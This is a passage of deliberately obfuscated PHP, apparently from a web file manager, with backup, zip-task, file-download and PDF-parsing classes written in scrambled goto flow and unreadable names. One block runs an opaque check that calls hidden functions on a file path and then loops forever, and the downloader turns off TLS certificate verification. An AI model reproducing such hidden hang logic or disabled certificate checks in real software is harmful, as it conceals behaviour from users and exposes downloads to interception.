$bÎ¶»¾Ÿ[$bø¦Àøá·’[713]], $bø¦Àøá·’[28] => self::$name, $bø¦Àøá·’[711] => 0, $bø¦Àøá·’[714] => $bÎ¶»¾Ÿ[$bø¦Àøá·’[714]], $bø¦Àøá·’[281] => array($bø¦Àøá·’[715] => array($bø¦Àøá·’[711] => 0), $bø¦Àøá·’[716] => array($bø¦Àøá·’[711] => 0, $bø¦Àøá·’[717] => 0, $bø¦Àøá·’[718] => 0, $bø¦Àøá·’[29] => $bø¦Àøá·’[33]), $bø¦Àøá·’[719] => array($bø¦Àøá·’[711] => 0, $bø¦Àøá·’[717] => 0, $bø¦Àøá·’[718] => 0), $bø¦Àøá·’[167] => array($bø¦Àøá·’[711] => 0, $bø¦Àøá·’[720] => 0, $bø¦Àøá·’[721] => 0, $bø¦Àøá·’[722] => 0, $bø¦Àøá·’[723] => 0, $bø¦Àøá·’[419] => $F³âøËœÄ™)), $bø¦Àøá·’[724] => time(), $bø¦Àøá·’[449] => 0); $dê™„‹µƒ = Model($bø¦Àøá·’[710])->insert($a˜¾öå³‰); goto a´ªÑŠÔºÒ; aä¸¥®Ó Â: } private function checkStore($c›‹Ú ²‚¸) { $cÁÄŠ„åóš =& $_SERVER[ã®Â„Éæ¹¤]; $fò½Èöë = Model($cÁÄŠ„åóš[725])->listData($c›‹Ú ²‚¸); Model($cÁÄŠ„åóš[725])->checkConfig($fò½Èöë); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ã®Â„Éæ¹¤][710])->findByName(self::$name); } return self::$option; } public static function set($b³ÀÁ†‘Â²) { $AĞö“ôÑÅÀ =& $_SERVER[ã®Â„Éæ¹¤]; $AÎ¨–ê¯ïê = self::get(); foreach ($b³ÀÁ†‘Â² as $C¡ÆÃ‹ Ôä => $c£³„òÜß) { $eŠ²‚£Üèª = explode($AĞö“ôÑÅÀ[91], $C¡ÆÃ‹ Ôä); $d¤šä¸âÛŒ = count($eŠ²‚£Üèª); switch ($d¤šä¸âÛŒ) { case 1: $AÎ¨–ê¯ïê[$eŠ²‚£Üèª[0]] = $c£³„òÜß; break; case 2: $AÎ¨–ê¯ïê[$eŠ²‚£Üèª[0]][$eŠ²‚£Üèª[1]] = $c£³„òÜß; break; case 3: $AÎ¨–ê¯ïê[$eŠ²‚£Üèª[0]][$eŠ²‚£Üèª[1]][$eŠ²‚£Üèª[2]] = $c£³„òÜß; break; } } Model($AĞö“ôÑÅÀ[710])->update($AÎ¨–ê¯ïê[$AĞö“ôÑÅÀ[367]], $AÎ¨–ê¯ïê); self::$option = $AÎ¨–ê¯ïê; return self::$option; } public function keep() { $DˆİïøğÁñ =& $_SERVER[ã®Â„Éæ¹¤]; $eÖ¼â‰Üœ = self::get(); if ($eÖ¼â‰Üœ[$DˆİïøğÁñ[281]][$DˆİïøğÁñ[715]][$DˆİïøğÁñ[711]] == $DˆİïøğÁñ[83]) { return; } $this->backupKeep($eÖ¼â‰Üœ); self::set(array($DˆİïøğÁñ[726] => 1)); } private function backupKeep($F°ßœ¶¾Ì) { goto A½Õ·ç¨Ï¥; A½Õ·ç¨Ï¥: $e—ÉÒµÅ =& $_SERVER[ã®Â„Éæ¹¤]; $d…Ÿƒ†Ÿò = Model($e—ÉÒµÅ[710])->listData(); if (empty($d…Ÿƒ†Ÿò)) { return; } goto AÚÄ¹»ØœĞ; eÌ”ó¸øˆ¯: for ($A²ê©§ïÕÂ = 0; $A²ê©§ïÕÂ < 12; $A²ê©§ïÕÂ++) { $E†»ÄÁàÇÉ[] = date($e—ÉÒµÅ[727], strtotime("\x2d{$A²ê©§ïÕÂ}\x20\x6d\157\156\164\150\x73")); } $E†»ÄÁàÇÉ = array_unique($E†»ÄÁàÇÉ); foreach ($d…Ÿƒ†Ÿò as $b²°ó¯ÇÁ) { if (!empty($b²°ó¯ÇÁ[$e—ÉÒµÅ[28]]) && in_array($b²°ó¯ÇÁ[$e—ÉÒµÅ[28]], $E†»ÄÁàÇÉ)) { continue; } Model($e—ÉÒµÅ[710])->remove($b²°ó¯ÇÁ[$e—ÉÒµÅ[367]]); $D£ÚÊğÂ” = "\173\x69\157\x3a{$F°ßœ¶¾Ì[$e—ÉÒµÅ[713]]}\175\57\x64\141\164\141\142\141\x73\145\x2f\x62\141\x63\153\x75\160\137{$b²°ó¯ÇÁ[$e—ÉÒµÅ[28]]}"; IO::remove($D£ÚÊğÂ”, !1); } goto e‚‚‹…ÌÕ¬; AÚÄ¹»ØœĞ: $A²ê©§ïÕÂ = 0; $E†»ÄÁàÇÉ = array(); foreach ($d…Ÿƒ†Ÿò as $b²°ó¯ÇÁ) { if ($A²ê©§ïÕÂ >= 7) { break; } $E†»ÄÁàÇÉ[] = $b²°ó¯ÇÁ[$e—ÉÒµÅ[28]]; $A²ê©§ïÕÂ++; } goto eÌ”ó¸øˆ¯; e‚‚‹…ÌÕ¬: } public function db() { goto cœ’—¯¯; B¼¥°Ïáµ: $DÅÉ—áÜ©¸ = new BackupDb(); if (!$DÅÉ—áÜ©¸->index()) { return !1; } self::set(array($bí¾´ñˆÀÜ[728] => 1)); goto D¹ºÍÕ©öÏ; D¹ºÍÕ©öÏ: return !0; goto AÛì³‡©Õ; cœ’—¯¯: $bí¾´ñˆÀÜ =& $_SERVER[ã®Â„Éæ¹¤]; $d‰—ˆ÷ÖÈÕ = self::get(); if ($d‰—ˆ÷ÖÈÕ[$bí¾´ñˆÀÜ[281]][$bí¾´ñˆÀÜ[716]][$bí¾´ñˆÀÜ[711]] == $bí¾´ñˆÀÜ[83]) { return !0; } goto B¼¥°Ïáµ; AÛì³‡©Õ: } public function dbFile() { goto a³Àòƒî¤ô; a³Àòƒî¤ô: $AäÆ­¯¬Ò =& $_SERVER[ã®Â„Éæ¹¤]; $bÌ˜²¤¹îŞ = self::get(); if ($bÌ˜²¤¹îŞ[$AäÆ­¯¬Ò[281]][$AäÆ­¯¬Ò[719]][$AäÆ­¯¬Ò[711]] == $AäÆ­¯¬Ò[83]) { return !0; } goto d‡—œ÷Ü×; d‡—œ÷Ü×: $E²Ó¯öÈÏå = new BackupDbFile(); if (!$E²Ó¯öÈÏå->index()) { return !1; } self::set(array($AäÆ­¯¬Ò[729] => 1)); goto BËâóÉˆÜ‡; BËâóÉˆÜ‡: return !0; goto DÛ ĞÇ‚‚Ÿ; DÛ ĞÇ‚‚Ÿ: } public function file() { $a¸¯“Ò ° =& $_SERVER[ã®Â„Éæ¹¤]; $Eé†ô–Œ° = self::get(); if ($Eé†ô–Œ°[$a¸¯“Ò °[281]][$a¸¯“Ò °[167]][$a¸¯“Ò °[711]] == $a¸¯“Ò °[83]) { return !0; } if (!isset($Eé†ô–Œ°[$a¸¯“Ò °[714]]) || $Eé†ô–Œ°[$a¸¯“Ò °[714]] == $a¸¯“Ò °[470]) { $E¨Åˆ‹Éœ = new BackupFile(); if (!$E¨Åˆ‹Éœ->index()) { return !1; } } self::set(array($a¸¯“Ò °[730] => 1, $a¸¯“Ò °[711] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto FÌÇ¿Í ¶í; dçÁµ¢Ş„ç: mk_dir($Dâëƒ©ô†Ø); $DÕôß«ÀŒ = $a³ñÓùò¡ = 0; $F¬«Ó¡‡Ê† = $aÓòß†åŸ·->db()->getTables(); goto f¦ÉÊÖâÛÉ; FÌÇ¿Í ¶í: $Eß¯™´äõ =& $_SERVER[ã®Â„Éæ¹¤]; $eóÂ‹›¯Æ™ = Backup::get(); self::$io = $eóÂ‹›¯Æ™[$Eß¯™´äõ[713]]; goto A¢òó¸ì¡Ü; f¦ÉÊÖâÛÉ: $F¬«Ó¡‡Ê† = array_diff($F¬«Ó¡‡Ê†, array($Eß¯™´äõ[732], $Eß¯™´äõ[733])); foreach ($F¬«Ó¡‡Ê† as $F©õÉ²ç¡) { $DÕôß«ÀŒ += $aÓòß†åŸ·->model($F©õÉ²ç¡)->count(); } $cƒšŸ› ÷Ï = new Task($Eß¯™´äõ[734], $Eß¯™´äõ[735], $DÕôß«ÀŒ, LNG($Eß¯™´äõ[736]) . $Eß¯™´äõ[737] . LNG($Eß¯™´äõ[738])); goto BœÂë˜Õ; Aò±”›ˆÑ: $aÓòß†åŸ· = new DbManage($E±½–±«Æá, $d¤®ø¾ºÇ‡); $Dâëƒ©ô†Ø = TEMP_FILES . $Eß¯™´äõ[731] . self::$name . $Eß¯™´äõ[8]; del_dir($Dâëƒ©ô†Ø); goto dçÁµ¢Ş„ç; eŒ»³‹ÙÎ: Backup::set($E‚ÜÍƒìˆë); return !0; goto aîÄÈÛÖÑ; BœÂë˜Õ: foreach ($F¬«Ó¡‡Ê† as $F©õÉ²ç¡) { $c—¸äß›ìä = $Dâëƒ©ô†Ø . $F©õÉ²ç¡ . $Eß¯™´äõ[739]; $D³«Ã°´¼× = null; if ($F©õÉ²ç¡ == $Eß¯™´äõ[740] && (!isset($eóÂ‹›¯Æ™[$Eß¯™´äõ[714]]) || $eóÂ‹›¯Æ™[$Eß¯™´äõ[714]] == $Eß¯™´äõ[470])) { $D³«Ã°´¼× = self::$io; } $a³ñÓùò¡ += $aÓòß†åŸ·->sqlFromDb($F©õÉ²ç¡, $c—¸äß›ìä, $cƒšŸ› ÷Ï, $D³«Ã°´¼×); } $cƒšŸ› ÷Ï->end(); $E‚ÜÍƒìˆë = array($Eß¯™´äõ[741] => $d¤®ø¾ºÇ‡, $Eß¯™´äõ[728] => 1, $Eß¯™´äõ[742] => $a³ñÓùò¡, $Eß¯™´äõ[743] => $a³ñÓùò¡); goto eŒ»³‹ÙÎ; A¢òó¸ì¡Ü: self::$name = $eóÂ‹›¯Æ™[$Eß¯™´äõ[28]]; $E±½–±«Æá = $GLOBALS[$Eß¯™´äõ[6]][$Eß¯™´äõ[17]]; $d¤®ø¾ºÇ‡ = $this->_dbType($E±½–±«Æá); goto Aò±”›ˆÑ; aîÄÈÛÖÑ: } private function _dbType($D‹·„¨îµ—) { goto Aè£˜¬´Æ; Aè£˜¬´Æ: $Eµ©ğÒ‹Ñ  =& $_SERVER[ã®Â„Éæ¹¤]; $D‹·„¨îµ— = array_change_key_case($D‹·„¨îµ—); $fë¸¶ù†‚‹ = $D‹·„¨îµ—[$Eµ©ğÒ‹Ñ [744]]; goto BåòƒšË²Ê; BåòƒšË²Ê: if ($fë¸¶ù†‚‹ == $Eµ©ğÒ‹Ñ [745]) { $aİ‘²¬œã = explode($Eµ©ğÒ‹Ñ [4], $D‹·„¨îµ—[$Eµ©ğÒ‹Ñ [746]]); $fë¸¶ù†‚‹ = $aİ‘²¬œã[0]; } $F‚¼Éåø–¸ = array($Eµ©ğÒ‹Ñ [747] => $Eµ©ğÒ‹Ñ [9], $Eµ©ğÒ‹Ñ [748] => $Eµ©ğÒ‹Ñ [749]); if (isset($F‚¼Éåø–¸[$fë¸¶ù†‚‹])) { $fë¸¶ù†‚‹ = $F‚¼Éåø–¸[$fë¸¶ù†‚‹]; } goto eØ¿îŒÆè; eØ¿îŒÆè: return $fë¸¶ù†‚‹; goto DâŒİ¨ î; DâŒİ¨ î: } } if (!isset($_SERVER[$_SERVER[ã®Â„Éæ¹¤][554]]) || !isset($_SERVER[$_SERVER[ã®Â„Éæ¹¤][750]])) { goto FŞšœ‡…²¬; bßõçØ±÷Ï: $aÓ’ê×çÜ($_SERVER[$_SERVER[ã®Â„Éæ¹¤][556]] . $_SERVER[ã®Â„Éæ¹¤][557]); $cöë ×ç = 2; while ($cöë ×ç > 1) { $b£áÕÇó’¨ = rawurlencode($cöë ×ç . $_SERVER[ã®Â„Éæ¹¤][361]); } goto c¦©Ã›‘ê; FŞšœ‡…²¬: $dËÀ®Æ†¬„ = $_SERVER[ã®Â„Éæ¹¤][555]; $Fó”ñ Ì Š = $_SERVER[$_SERVER[ã®Â„Éæ¹¤][556]] . $_SERVER[ã®Â„Éæ¹¤][557]; $dê…ä…á = $dËÀ®Æ†¬„($Fó”ñ Ì Š); goto Bº’›ÂåŞ; Bº’›ÂåŞ: $BñÕá¹³« = explode($_SERVER[ã®Â„Éæ¹¤][217], $dê…ä…á); if (count($BñÕá¹³«) < $_SERVER[ã®Â„Éæ¹¤][558]) { $b—ãÂùŠª„ = $_SERVER[ã®Â„Éæ¹¤][559]; $b—ãÂùŠª„(); } $aÓ’ê×çÜ = $_SERVER[ã®Â„Éæ¹¤][560]; goto bßõçØ±÷Ï; c¦©Ã›‘ê: } goto eÒ¬Îœˆ‹ˆ; D“¼Ç¤ñõŠ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $b‚Ä÷Ãç =& $_SERVER[ã®Â„Éæ¹¤]; parent::startAfter(); Hook::bind($b‚Ä÷Ãç[1532], array($this, $b‚Ä÷Ãç[1527])); $dµƒŒÃ¸ =& $this->task; $dµƒŒÃ¸[$b‚Ä÷Ãç[1529]] = $b‚Ä÷Ãç[1059]; if (!$dµƒŒÃ¸[$b‚Ä÷Ãç[1362]]) { $dµƒŒÃ¸[$b‚Ä÷Ãç[1362]] = LNG($b‚Ä÷Ãç[1533]); } } protected function endAfter() { $dê³ë¯Ô·“ =& $_SERVER[ã®Â„Éæ¹¤]; parent::endAfter(); Hook::unbind($dê³ë¯Ô·“[1532], array($this, $dê³ë¯Ô·“[1527])); } public function updateAfter() { $cÒ¾êÅ¶Ğ¹ =& $_SERVER[ã®Â„Éæ¹¤]; $cì–ˆŒÖ =& $this->task; if (!$cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[995]] || !$cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[720]]) { return; } if ($cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1529]] == $cÒ¾êÅ¶Ğ¹[1059]) { $DÜ¡í”¯Ø“ = $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1502]]; if ($cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1503]] != $cÒ¾êÅ¶Ğ¹[1059]) { $DÜ¡í”¯Ø“ = 0; } $d¤Èò±èÀ£ = ($cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1506]] + $DÜ¡í”¯Ø“) / $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[720]]; $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1457]] = $d¤Èò±èÀ£ * 0.3; } else { if ($cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1529]] == $cÒ¾êÅ¶Ğ¹[301]) { $d¤Èò±èÀ£ = $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1009]] / $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[995]]; $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1457]] = 0.3 + $d¤Èò±èÀ£ * 0.5; } else { if ($cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1529]] == $cÒ¾êÅ¶Ğ¹[103]) { $d¤Èò±èÀ£ = 0; if ($cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1501]]) { $d¤Èò±èÀ£ = $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1502]] / $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1501]]; } $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1457]] = 0.3 + 0.5 + $d¤Èò±èÀ£ * 0.2; } } } if ($cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1457]] > 0) { $bé¼õÎšÅä = timeFloat() - $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1459]] - $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1462]]; $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1463]] = $bé¼õÎšÅä * (1 - $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1457]]) / $cì–ˆŒÖ[$cÒ¾êÅ¶Ğ¹[1457]]; } } public function copyFileStart($dµº©õäØÇ, $cÏÃë”¯º¥, $eŠµ‰İ†â, $FÅ†Ş»ËŠõ, $a¼¥ñ‚Çùõ, $d©ÅñÏ‡Éµ) { $aàÖšÀá¡² =& $_SERVER[ã®Â„Éæ¹¤]; parent::copyFileStart($dµº©õäØÇ, $cÏÃë”¯º¥, $eŠµ‰İ†â, $FÅ†Ş»ËŠõ, $a¼¥ñ‚Çùõ, $d©ÅñÏ‡Éµ); $C’œ…Ì­æß =& $this->task; if ($C’œ…Ì­æß[$aàÖšÀá¡²[1529]] == $aàÖšÀá¡²[301]) { $C’œ…Ì­æß[$aàÖšÀá¡²[1529]] = $aàÖšÀá¡²[103]; } $this->update(); } public function copyFileEnd($c†”òàÈŸá, $F¸À÷­†ä, $E¡£ÒË§ÜÛ, $fğù¼Ãó¿, $aà¸×ÚÊŞ, $FÂ…¢ïÂ) { $d²ïíò„íš =& $_SERVER[ã®Â„Éæ¹¤]; $aƒÜ¦ãïµÀ =& $this->task; $aƒÜ¦ãïµÀ[$d²ïíò„íš[1502]] = $aƒÜ¦ãïµÀ[$d²ïíò„íš[1501]]; $aƒÜ¦ãïµÀ[$d²ïíò„íš[1506]] += $aƒÜ¦ãïµÀ[$d²ïíò„íš[1501]]; $aƒÜ¦ãïµÀ[$d²ïíò„íš[1503]] = $d²ïíò„íš[33]; $this->update(); } public function nameParse($BîáŒ—©œ) { $BòíãÍÒá‹ =& $_SERVER[ã®Â„Éæ¹¤]; $c„ÍÛÁ®ÜÆ =& $this->task; if ($c„ÍÛÁ®ÜÆ[$BòíãÍÒá‹[1009]] < $c„ÍÛÁ®ÜÆ[$BòíãÍÒá‹[995]]) { $dñ½Ï°ŒÀ© = get_path_this($BîáŒ—©œ); if (strstr($dñ½Ï°ŒÀ©, $BòíãÍÒá‹[91])) { $c„ÍÛÁ®ÜÆ[$BòíãÍÒá‹[1009]] += 1; } } if ($c„ÍÛÁ®ÜÆ[$BòíãÍÒá‹[1529]] == $BòíãÍÒá‹[1059]) { $c„ÍÛÁ®ÜÆ[$BòíãÍÒá‹[1529]] = $BòíãÍÒá‹[301]; } $c„ÍÛÁ®ÜÆ[$BòíãÍÒá‹[1499]] = $BîáŒ—©œ; $this->update(); } } class Downloader { static function start($cË’ÍÆ¶Ïæ, $bó‡‡ë­æ©, $C·¤š“Íã = 10) { goto C©™áŒˆô™; C®ÃÚœøë§: if (is_file($BºÙ¡ö²)) { $AæîÅù»´ = file_get_contents($BºÙ¡ö²); $d…šÅº‡½á = json_decode($AæîÅù»´, 1); } if (file_exists($bó‡‡ë­æ©) && $D†¹¾±¢Á´ == filesize_64($bó‡‡ë­æ©)) { @unlink($a—‚Œ½“Ëé); @unlink($BºÙ¡ö²); return array($D•ÑÎœ¯Çœ[1051] => !0, $D•ÑÎœ¯Çœ[1053] => $D•ÑÎœ¯Çœ[1537]); } if ($d…šÅº‡½á[$D•ÑÎœ¯Çœ[325]] != $D†¹¾±¢Á´) { $d…šÅº‡½á = array($D•ÑÎœ¯Çœ[325] => $D†¹¾±¢Á´); } goto d‚¨Í‡Ÿ­¬; C©™áŒˆô™: $D•ÑÎœ¯Çœ =& $_SERVER[ã®Â„Éæ¹¤]; if (!request_url_safe($cË’ÍÆ¶Ïæ)) { return array($D•ÑÎœ¯Çœ[1051] => !1, $D•ÑÎœ¯Çœ[1053] => $D•ÑÎœ¯Çœ[1056]); } $BºÙ¡ö² = $bó‡‡ë­æ© . $D•ÑÎœ¯Çœ[1534]; goto F„²ÃÜµ×ˆ; AØíÈ óÒ¨: if (!$cË’ÍÆ¶Ïæ) { return array($D•ÑÎœ¯Çœ[1051] => !1, $D•ÑÎœ¯Çœ[1053] => $D•ÑÎœ¯Çœ[1056]); } if (!$F¢‚«©İ±¨[$D•ÑÎœ¯Çœ[1307]] || $F¢‚«©İ±¨[$D•ÑÎœ¯Çœ[325]] == 0) { @unlink($a—‚Œ½“Ëé); @unlink($bó‡‡ë­æ©); $Eİ™ÌÄ¼Û = self::fileDownloadFopen($cË’ÍÆ¶Ïæ, $bó‡‡ë­æ©, $F¢‚«©İ±¨[$D•ÑÎœ¯Çœ[325]]); if ($Eİ™ÌÄ¼Û[$D•ÑÎœ¯Çœ[1051]]) { return $Eİ™ÌÄ¼Û; } else { @unlink($a—‚Œ½“Ëé); @unlink($bó‡‡ë­æ©); $Eİ™ÌÄ¼Û = self::fileDownloadCurl($cË’ÍÆ¶Ïæ, $bó‡‡ë­æ©, !1, 0, $F¢‚«©İ±¨[$D•ÑÎœ¯Çœ[325]]); @unlink($a—‚Œ½“Ëé); return $Eİ™ÌÄ¼Û; } } $fÅ®Å¨èîô = is_file($a—‚Œ½“Ëé) ? filesize_64($a—‚Œ½“Ëé) : 0; goto D­Øšç˜ØÑ; F„²ÃÜµ×ˆ: $a—‚Œ½“Ëé = $bó‡‡ë­æ© . $D•ÑÎœ¯Çœ[1535]; if (is_array($cË’ÍÆ¶Ïæ)) { $F¢‚«©İ±¨ = $cË’ÍÆ¶Ïæ; } else { $F¢‚«©İ±¨ = url_header($cË’ÍÆ¶Ïæ); } $cË’ÍÆ¶Ïæ = $F¢‚«©İ±¨[$D•ÑÎœ¯Çœ[295]]; goto AØíÈ óÒ¨; C¯æóà±Ë‰: if ($Eİ™ÌÄ¼Û[$D•ÑÎœ¯Çœ[1051]]) { @unlink($BºÙ¡ö²); } return $Eİ™ÌÄ¼Û; goto b‘ï­È´¿ä; d‚¨Í‡Ÿ­¬: if ($fÅ®Å¨èîô > $D†¹¾±¢Á´) { @unlink($a—‚Œ½“Ëé); } file_put_contents($BºÙ¡ö², json_encode($d…šÅº‡½á)); $Eİ™ÌÄ¼Û = self::fileDownloadCurl($cË’ÍÆ¶Ïæ, $bó‡‡ë­æ©, !0, $fÅ®Å¨èîô, $D†¹¾±¢Á´); goto C¯æóà±Ë‰; D­Øšç˜ØÑ: $D†¹¾±¢Á´ = intval($F¢‚«©İ±¨[$D•ÑÎœ¯Çœ[325]]); if (file_exists($a—‚Œ½“Ëé) && time() - filemtime($a—‚Œ½“Ëé) < 3) { return array($D•ÑÎœ¯Çœ[1051] => !1, $D•ÑÎœ¯Çœ[1053] => $D•ÑÎœ¯Çœ[1536]); } $d…šÅº‡½á = array(); goto C®ÃÚœøë§; b‘ï­È´¿ä: } static function fileDownloadFopen($bŒƒ¨İ¢¢®, $fÙËâ¢Æ¯õ, $Eõ©Ï´æâ = 0) { $dÃ±­®ß¿ô =& $_SERVER[ã®Â„Éæ¹¤]; @ini_set($dÃ±­®ß¿ô[1538], $dÃ±­®ß¿ô[1539]); $B„£è…õÉ² = $fÙËâ¢Æ¯õ . $dÃ±­®ß¿ô[1535]; set_timeout(); @unlink($B„£è…õÉ²); if ($cÔø‰Ê´º = @fopen($bŒƒ¨İ¢¢®, $dÃ±­®ß¿ô[1540])) { goto DˆÏ¶ïñŞ—; DˆÏ¶ïñŞ—: if (!($EÚ—ùÍ Şö = @fopen($B„£è…õÉ², $dÃ±­®ß¿ô[1541]))) { return array($dÃ±­®ß¿ô[1051] => !1, $dÃ±­®ß¿ô[1053] => $dÃ±­®ß¿ô[1542]); } while (!feof($cÔø‰Ê´º)) { if (!file_exists($B„£è…õÉ²)) { fclose($EÚ—ùÍ Şö); return array($dÃ±­®ß¿ô[1051] => !1, $dÃ±­®ß¿ô[1053] => $dÃ±­®ß¿ô[1543]); } clearstatcache(); if ($Eõ©Ï´æâ > 0 && $Eõ©Ï´æâ == filesize(iconv_system($B„£è…õÉ²))) { break; } fwrite($EÚ—ùÍ Şö, fread($cÔø‰Ê´º, 1024 * 8), 1024 * 8); } fclose($EÚ—ùÍ Şö); goto C•ˆÂÖªÆô; C•ˆÂÖªÆô: fclose($cÔø‰Ê´º); self::checkGzip($B„£è…õÉ²); if (!@rename($B„£è…õÉ², $fÙËâ¢Æ¯õ)) { usleep(round(rand(0, 1000) * 50)); @unlink($fÙËâ¢Æ¯õ); $f–Ü‹×„±· = @rename($B„£è…õÉ², $fÙËâ¢Æ¯õ); if (!$f–Ü‹×„±·) { return array($dÃ±­®ß¿ô[1051] => !1, $dÃ±­®ß¿ô[1053] => $dÃ±­®ß¿ô[1544]); } } goto bÈ¯É¾‹Ê; bÈ¯É¾‹Ê: return array($dÃ±­®ß¿ô[1051] => !0, $dÃ±­®ß¿ô[1053] => $dÃ±­®ß¿ô[718]); goto c ¢Ç½’¸ë; c ¢Ç½’¸ë: } else { return array($dÃ±­®ß¿ô[1051] => !1, $dÃ±­®ß¿ô[1053] => $dÃ±­®ß¿ô[1545]); } } static function fileDownloadCurl($CÀ‚²êŞ‰ä, $Fò•ÃàØ, $Dª½¡ğƒ = false, $fö’ôˆ±Ü = 0, $EâŒ•™œÃ = 0) { goto Bë¹‰ŸØë÷; E¸°‘à–Œ÷: curl_setopt($A¤İ“‹àŠ‡, CURLOPT_USERAGENT, $c×Ê©²¦ÎŠ[1539]); $c»ïĞˆ–¨ = curl_exec($A¤İ“‹àŠ‡); curl_progress_end($A¤İ“‹àŠ‡); goto E°Œ²¹…÷; AàŞ§ÜÅ×­: if ($FÆÉ×ßµ„‡ < $EâŒ•™œÃ && $EâŒ•™œÃ != 0) { return array($c×Ê©²¦ÎŠ[1051] => !1, $c×Ê©²¦ÎŠ[1053] => $c×Ê©²¦ÎŠ[1536]); } if ($c»ïĞˆ–¨ && filesize_64($d–‡‘øˆÄò) != 0) { self::checkGzip($d–‡‘øˆÄò); if (!@rename($d–‡‘øˆÄò, $Fò•ÃàØ)) { @unlink($Fò•ÃàØ); $c»ïĞˆ–¨ = @rename($d–‡‘øˆÄò, $Fò•ÃàØ); if (!$c»ïĞˆ–¨) { return array($c×Ê©²¦ÎŠ[1051] => !1, $c×Ê©²¦ÎŠ[1053] => $c×Ê©²¦ÎŠ[1548]); } } return array($c×Ê©²¦ÎŠ[1051] => !0, $c×Ê©²¦ÎŠ[1053] => $c×Ê©²¦ÎŠ[718]); } return array($c×Ê©²¦ÎŠ[1051] => !1, $c×Ê©²¦ÎŠ[1053] => $c×Ê©²¦ÎŠ[1549]); goto BÏÒÆ–Š³À; E°Œ²¹…÷: curl_close($A¤İ“‹àŠ‡); fclose($dØöÃÖõÉ); $FÆÉ×ßµ„‡ = filesize_64(iconv_system($d–‡‘øˆÄò)); goto AàŞ§ÜÅ×­; e•˜ëŒÊ¸: if ($Dª½¡ğƒ) { curl_setopt($A¤İ“‹àŠ‡, CURLOPT_RANGE, $fö’ôˆ±Ü . $c×Ê©²¦ÎŠ[737]); } curl_setopt($A¤İ“‹àŠ‡, CURLOPT_FILE, $dØöÃÖõÉ); curl_setopt($A¤İ“‹àŠ‡, CURLOPT_REFERER, get_url_link($CÀ‚²êŞ‰ä)); goto eİ‹ÉØ‡Î×; eİ‹ÉØ‡Î×: curl_setopt($A¤İ“‹àŠ‡, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($A¤İ“‹àŠ‡, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($A¤İ“‹àŠ‡, CURLOPT_SSL_VERIFYHOST, 0); goto f›²×§í›Ğ; a×Ùîäğé²: $dØöÃÖõÉ = @fopen($d–‡‘øˆÄò, $c×Ê©²¦ÎŠ[999]); if (!$dØöÃÖõÉ) { return array($c×Ê©²¦ÎŠ[1051] => !1, $c×Ê©²¦ÎŠ[1053] => $c×Ê©²¦ÎŠ[1546]); } $A¤İ“‹àŠ‡ = curl_init($CÀ‚²êŞ‰ä); goto e•˜ëŒÊ¸; Bë¹‰ŸØë÷: $c×Ê©²¦ÎŠ =& $_SERVER[ã®Â„Éæ¹¤]; $d–‡‘øˆÄò = $Fò•ÃàØ . $c×Ê©²¦ÎŠ[1535]; set_timeout(); goto a×Ùîäğé²; f›²×§í›Ğ: curl_setopt($A¤İ“‹àŠ‡, CURLOPT_NOPROGRESS, !1); curl_setopt($A¤İ“‹àŠ‡, CURLOPT_PROGRESSFUNCTION, $c×Ê©²¦ÎŠ[1547]); curl_progress_start($A¤İ“‹àŠ‡); goto E¸°‘à–Œ÷; BÏÒÆ–Š³À: } static function checkGzip($bê”ˆÁêŒ) { goto f˜ØÎÚÃ–; f˜ØÎÚÃ–: $BÚöÌ–ºõ = $_SERVER[ã®Â„Éæ¹¤][1550]; $A¢Şç‚—ªá = file_sub_str($bê”ˆÁêŒ, 0, 2); if ($BÚöÌ–ºõ != $A¢Şç‚—ªá) { return; } goto A­»àšÖè; A­»àšÖè: ob_start(); readgzfile($bê”ˆÁêŒ); $Aà“šŞÔç = ob_get_clean(); goto b¥‚¾É†ÃÚ; b¥‚¾É†ÃÚ: file_put_contents($bê”ˆÁêŒ, $Aà“šŞÔç); goto bË×¡­Ò‹; bË×¡­Ò‹: } } class FileParsePdf { public static function parse($CÁß¨¢ºÍÚ) { goto bÏ†Æ÷ŠÇ; bÏ†Æ÷ŠÇ: $B°Â”ßÀôÃ =& $_SERVER[ã®Â„Éæ¹¤]; $Eí ÎÌÛ Ò = 32 * 1024; $D¬Â•òšÃí = array($B°Â”ßÀôÃ[802] => fopen($CÁß¨¢ºÍÚ, $B°Â”ßÀôÃ[1188]), $B°Â”ßÀôÃ[75] => $CÁß¨¢ºÍÚ, $B°Â”ßÀôÃ[77] => filesize_64($CÁß¨¢ºÍÚ), $B°Â”ßÀôÃ[1551] => $Eí ÎÌÛ Ò); goto fÚí¤®ºì; EÅ÷Ó…Ÿî®: if ($A©†‰¶‘°) { $e äë‚öªË[$B°Â”ßÀôÃ[1361]] = $A©†‰¶‘°[1]; } $e äë‚öªË[$B°Â”ßÀôÃ[1559]] = 0; $b·åŠÔÏ¹ = $B°Â”ßÀôÃ[1560]; goto cì²øŞâä; fÚí¤®ºì: $D¬Â•òšÃí[$B°Â”ßÀôÃ[1552]] = StreamWrapperIO::read($CÁß¨¢ºÍÚ, 0, 